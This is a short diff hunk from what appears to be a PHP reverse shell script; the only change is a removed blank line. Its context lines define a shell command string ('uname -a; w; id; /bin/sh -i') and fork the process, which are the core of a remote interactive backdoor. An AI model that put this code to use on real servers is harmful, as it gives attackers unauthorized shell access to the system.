@@ -10,7 +10,6 @@ $shell = 'uname -a; w; id; /bin/sh -i';
 $daemon = 0;
 $debug = 0;
 
-
 if (function_exists('pcntl_fork')) {
 	$pid = pcntl_fork();
 	
